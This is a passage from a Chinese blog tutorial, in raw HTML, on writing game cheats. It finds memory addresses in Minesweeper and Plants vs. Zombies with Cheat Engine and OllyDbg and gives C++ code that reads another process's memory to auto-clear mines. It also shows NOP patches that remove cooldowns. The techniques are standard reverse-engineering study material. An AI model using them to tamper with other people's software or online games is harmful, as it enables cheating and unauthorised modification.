class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EBP+8    &gt;|0011029C</span><br><span class=\"line\">EBP+C    &gt;|00000111</span><br><span class=\"line\">EBP+10   &gt;|0000020A</span><br><span class=\"line\">EBP+14   &gt;|00000000</span><br></pre></td></tr></table></figure>\n<p>​\t高级菜单 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EBP+8    &gt;|0011029C</span><br><span class=\"line\">EBP+C    &gt;|00000111</span><br><span class=\"line\">EBP+10   &gt;|0000020B</span><br><span class=\"line\">EBP+14   &gt;|00000000</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128194129162.png\" alt=\"image-20221128194129162\"></p>\n<p>注入代码调试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 0</span><br><span class=\"line\">push 0x20b</span><br><span class=\"line\">push 0x111</span><br><span class=\"line\">push 0x001A03DA</span><br><span class=\"line\">call 0x01001BC9</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128204020367.png\" alt=\"image-20221128204020367\"></p>\n</blockquote>\n<h3 id=\"2分析游戏基地址\"><a class=\"markdownIt-Anchor\" href=\"#2分析游戏基地址\">#</a> 2. 分析游戏基地址</h3>\n<blockquote>\n<p>基地址概念</p>\n<p>全局变量，字符常量等的地址</p>\n<p>1. 使用 CE 内存查找工具查找数据的地址</p>\n<p>2. 在 od 中验证是否为基地址</p>\n<p>​\t通过下内存断点方式验证</p>\n<p>通过 ce 找到基地址，new scan 后改变数值进行 next scan</p>\n<p>1. 首次先让要查找的数据稳定在某个范围 (或者某个精确的值)</p>\n<p>2. 改变要查找的数据，根据变化筛选出数据的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128205517107.png\" alt=\"image-20221128205517107\"></p>\n<p>在扫雷中，小旗子剩余数量的基地址为 01005194</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0100346E  |.  0105 94510001 add     dword ptr ds:[0x1005194],eax</span><br></pre></td></tr></table></figure>\n<p>立即数寻址的一般都是基地址</p>\n</blockquote>\n<h3 id=\"3游戏菜单点击与读取基地址\"><a class=\"markdownIt-Anchor\" href=\"#3游戏菜单点击与读取基地址\">#</a> 3. 游戏菜单点击与读取基地址</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void CsaoleiDlg::OnBnClickedButton1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20A, 0);  //发送WindowProc的参数</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20B, 0);  //发送WindowProc的参数</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\twhile (TRUE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tOnBnClickedButton1();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t\tOnBnClickedButton2();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t\t/*</span><br><span class=\"line\">\tBOOL ReadProcessMemory(</span><br><span class=\"line\">\t  HANDLE hProcess,</span><br><span class=\"line\">\t  LPCVOID lpBaseAddress,</span><br><span class=\"line\">\t  LPVOID lpBuffer,</span><br><span class=\"line\">\t  DWORD nSize,</span><br><span class=\"line\">\t  LPDWORD lpNumberOfBytesRead</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tHANDLE OpenProcess( </span><br><span class=\"line\">\t  DWORD fdwAccess, </span><br><span class=\"line\">\t  BOOL fInherit, </span><br><span class=\"line\">\t  DWORD IDProcess</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDWORD GetWindowThreadProcessId(</span><br><span class=\"line\">\t  HWND hWnd,</span><br><span class=\"line\">\t  LPDWORD lpdwProcessId</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t*/</span><br><span class=\"line\">\tDWORD pid;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  //通过进程ID拿到进程句柄</span><br><span class=\"line\">\tif (NULL == hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t//m_editbase1 是编辑框的绑定变量，类别为value，变量类型为int，变量名为m_editbase1</span><br><span class=\"line\">\tReadProcessMemory(hProcess, (LPCVOID)0x1005194, &amp;m_editbase1, sizeof(m_editbase1), &amp;pid);</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221130104547356.png\" alt=\"image-20221130104547356\"></p>\n<h3 id=\"4扫雷游戏辅助编写\"><a class=\"markdownIt-Anchor\" href=\"#4扫雷游戏辅助编写\">#</a> 4. 扫雷游戏辅助编写</h3>\n<blockquote>\n<p>1. 雷区数据分析</p>\n<p>中级 char a [24][32]  //ReadProcessMemory</p>\n<p>数据雷区基地址 0x01005361    ==  扫雷.exe+5361</p>\n<p>找基地址：new scan 时使用未知数，之后每一次 next scan 根据 change 或者 unchange 进行 next scan</p>\n<p>初级 9*9 ，内存中隔行存放，因为每一行占两行内存，10 代表结束</p>\n<p>只有点击第一下之后才开始布雷，winxp 扫雷特性</p>\n<p>0x8F 是雷，40 空白，40 对应 1，0x10 代表行 / 列结束标识</p>\n<p>宽基地址 0x01005334</p>\n<p>高基地址 0x01005338</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221130111727184.png\" alt=\"image-20221130111727184\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void CsaoleiDlg::OnBnClickedButton1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20A, 0);  //发送WindowProc的参数</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20B, 0);  //发送WindowProc的参数</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\twhile (TRUE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tOnBnClickedButton1();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t\tOnBnClickedButton2();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t\t/*</span><br><span class=\"line\">\tBOOL ReadProcessMemory(</span><br><span class=\"line\">\t  HANDLE hProcess,</span><br><span class=\"line\">\t  LPCVOID lpBaseAddress,</span><br><span class=\"line\">\t  LPVOID lpBuffer,</span><br><span class=\"line\">\t  DWORD nSize,</span><br><span class=\"line\">\t  LPDWORD lpNumberOfBytesRead</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tHANDLE OpenProcess( </span><br><span class=\"line\">\t  DWORD fdwAccess, </span><br><span class=\"line\">\t  BOOL fInherit, </span><br><span class=\"line\">\t  DWORD IDProcess</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDWORD GetWindowThreadProcessId(</span><br><span class=\"line\">\t  HWND hWnd,</span><br><span class=\"line\">\t  LPDWORD lpdwProcessId</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t*/</span><br><span class=\"line\">\tDWORD pid;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  //通过进程ID拿到进程句柄</span><br><span class=\"line\">\tif (NULL == hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tReadProcessMemory(hProcess, (LPCVOID)0x1005194, &amp;m_editbase1, sizeof(m_editbase1), &amp;pid);</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton5()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tDWORD pid;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  //通过进程ID拿到进程句柄</span><br><span class=\"line\">\tif (NULL == hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t/*</span><br><span class=\"line\">\t&gt; 0x8F是雷，40空白，40对应1，0x10代表行/列结束标识</span><br><span class=\"line\">\t&gt;</span><br><span class=\"line\">\t&gt; 宽基地址 0x01005334</span><br><span class=\"line\">\t&gt;</span><br><span class=\"line\">\t&gt; 高基地址 0x01005338</span><br><span class=\"line\">\t*/</span><br><span class=\"line\"></span><br><span class=\"line\">\tunsigned char gamedata[24][32] = &#123; 0 &#125;;</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x01005361, &amp;gamedata, 32*24, &amp;pid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开12&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tint dwHigth = 0;</span><br><span class=\"line\">\tm_strshowdata.Empty();</span><br><span class=\"line\">\tif (!ReadProcessMemory(hProcess, (LPCVOID)0x01005338, &amp;dwHigth, sizeof(dwHigth), &amp;pid))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开13&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tCString strTemp = _T(&quot;&quot;);</span><br><span class=\"line\">\t//第一个格子位置</span><br><span class=\"line\">\tshort gamex = 20;</span><br><span class=\"line\">\tshort gamey = 60;</span><br><span class=\"line\">\tunsigned  short xypos[2] = &#123; 0 &#125;;</span><br><span class=\"line\">\tfor (int i = 0; i &lt; dwHigth; i++)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tfor (int j = 0; j &lt; 32; j++)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tif (0x10 == gamedata[i][j])</span><br><span class=\"line\">\t\t\t\tbreak;</span><br><span class=\"line\">\t\t\txypos[0] = gamex + j * 16;</span><br><span class=\"line\">\t\t\txypos[1] = gamey + i * 16;</span><br><span class=\"line\">\t\t\tif (0x8F != gamedata[i][j])</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\t::PostMessage(hWnd, WM_LBUTTONDOWN,MK_LBUTTON,*(int *)xypos);</span><br><span class=\"line\">\t\t\t\t::PostMessage(hWnd, WM_LBUTTONUP,0,*(int *)xypos);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tstrTemp.Format(_T(&quot;%02X &quot;), gamedata[i][j]);</span><br><span class=\"line\">\t\t\tm_strshowdata += strTemp;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tm_strshowdata += _T(&quot;\\r\\n&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"5植物大战僵尸\"><a class=\"markdownIt-Anchor\" href=\"#5植物大战僵尸\">#</a> 5. 植物大战僵尸</h3>\n<p>1. 找阳光地址和基地址</p>\n<p>某一个程序每次运行都不改变的地址（基地址）里面存着阳光的地址</p>\n<p>我们需要找到不会改变的地址，通过偏移拿到阳光的地址</p>\n<p>1. 通过 ce 找到阳光地址，并且在 od 中定位</p>\n<p>dd 0F2EE158</p>\n<p>2. 下内存写入断点</p>\n<p>要是 CE 找的地址在 OD 中没有这个地址的话请在 CE 地址右键谁改写了此地址然后对照着到 OD 找</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221201211117079.png\" alt=\"image-20221201211117079\"></p>\n<p>第一个偏移地址</p>\n<p>阳光地址 0EDD32F8</p>\n<p>当前阳光地址 = eax + 0x5560     eax=0EDCDD98</p>\n<p>00430A11  |.  0188 60550000 add     dword ptr [eax+5560], ecx</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221202195211747.png\" alt=\"image-20221202195211747\"></p>\n<p>第二个偏移地址，找到谁改了 eax=0EDCDD98 的值</p>\n<p>还是去下内存断点</p>\n<p>00538090  |&gt; \\8B01          |mov     eax, dword ptr [ecx]          ;  PlantsVs.00656CA8</p>\n<p>ecx = 0EDCDD98</p>\n<p>eax = [ecx+5560]</p>\n<p>第三个偏移地址</p>\n<p>0053807D  |.  8B49 08       |mov     ecx, dword ptr [ecx+8]</p>\n<p>eax = [[ecx+8]+5560]     0EDCDD98</p>\n<p>基地址 [[6A9EC0]+768]+5560</p>\n<p>2. 分析金币基地址</p>\n<p>通过 ce 工具收集游戏金币基地址</p>\n<p>可能和金币 1:1，也可能是其他比例</p>\n<p>金币显示的值不是数字 1:1 对应关系，我们只能通过范围搜素定位金币地址</p>\n<p>金币的地址不是绿色的基地址所有，所以我们需要找到基地址 + 偏移地址表示他</p>\n<p>第一个偏移地址 06BA60A0</p>\n<p>0041A3BB - 8B 41 28  - mov eax,[ecx+28]         ECX=06BA6078</p>\n<p>金币的地址 = ecx  + 28</p>\n<p>第二个偏移地址</p>\n<p>0040EB41 - 8B 88 2C080000  - mov ecx,[eax+0000082C]        EAX=02101E48</p>\n<p>金币地址 = [eax+0000082c]+28</p>\n<p>第三个偏移地址</p>\n<p>00467B00 - 8B 0D C09E6A00  - mov ecx,[006A9EC0]</p>\n<p>金币地址 =[[006A9EC0]+82c]+28</p>\n<p>3. 分析植物安放冷却时间</p>\n<p>第一步</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0048728C - 83 47 24 01           - add dword ptr [edi+24],01 &#123; 1 &#125;</span><br><span class=\"line\">00487290 - 8B 47 24              - mov eax,[edi+24]</span><br><span class=\"line\">00487293 - 3B 47 28              - cmp eax,[edi+28]</span><br><span class=\"line\">00487296 - 7E 14                 - jle 004872AC</span><br><span class=\"line\">00487298 - C7 47 24 00000000     - mov [edi+24],00000000 &#123; 0 &#125;</span><br><span class=\"line\">0048729F - C6 47 49 00           - mov byte ptr [edi+49],00 &#123; 0 &#125;</span><br><span class=\"line\">004872A3 - C6 47 48 01           - mov byte ptr [edi+48],01 &#123; 1 &#125;</span><br><span class=\"line\">004872A7 - E8 E4FEFFFF           - call 00487190</span><br><span class=\"line\">004872AC - 8B 47 3C              - mov eax,[edi+3C]</span><br><span class=\"line\"></span><br><span class=\"line\">0BE14EC0</span><br></pre></td></tr></table></figure>\n<p>CD 计数器地址 = edi + 24</p>\n<p>CD 计数器上线 = edi + 28</p>\n<p>思路一：该计数器上限的值，缩短冷却时间</p>\n<p>思路二：改写代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0048728C - 83 47 24 01           - add dword ptr [edi+24],01 &#123; 1 &#125;</span><br><span class=\"line\">00487290 - 8B 47 24              - mov eax,[edi+24]</span><br><span class=\"line\">00487293 - 3B 47 28              - cmp eax,[edi+28]</span><br><span class=\"line\">00487296 - 90                    - nop </span><br><span class=\"line\">00487297 - 90                    - nop </span><br><span class=\"line\">00487298 - C7 47 24 00000000     - mov [edi+24],00000000 &#123; 0 &#125;</span><br><span class=\"line\">0048729F - C6 47 49 00           - mov byte ptr [edi+49],00 &#123; 0 &#125;</span><br><span class=\"line\">004872A3 - C6 47 48 01           - mov byte ptr [edi+48],01 &#123; 1 &#125;</span><br><span class=\"line\">004872A7 - E8 E4FEFFFF           - call 00487190</span><br><span class=\"line\">004872AC - 8B 47 3C              - mov eax,[edi+3C]</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>3. 分析大嘴花吞噬时间代码</p>\n<p>1. 定位大嘴花吞噬时间计数器变量的地址</p>\n<p>2. 通过 ce 或者 od 定位谁访问了这个地址，从而定位到判断大嘴花吞噬冷却时间的代码</p>\n<p 0=\"\">00461561 - 83 7F 54 00           - cmp dword ptr [edi+54],00</p>\n<p>00461565 - 75 5F                     - jne 004615C6</p>\n<p>4. 分析种植植物 call</p>\n<p>思路：找出安放植物的 call</p>\n<p>1. 通过鼠标右键选中植物的地址</p>\n<p>2. 分析 call 代码参数及堆栈</p>\n<figure class=\"highlight plaintext\"><table><tr><td 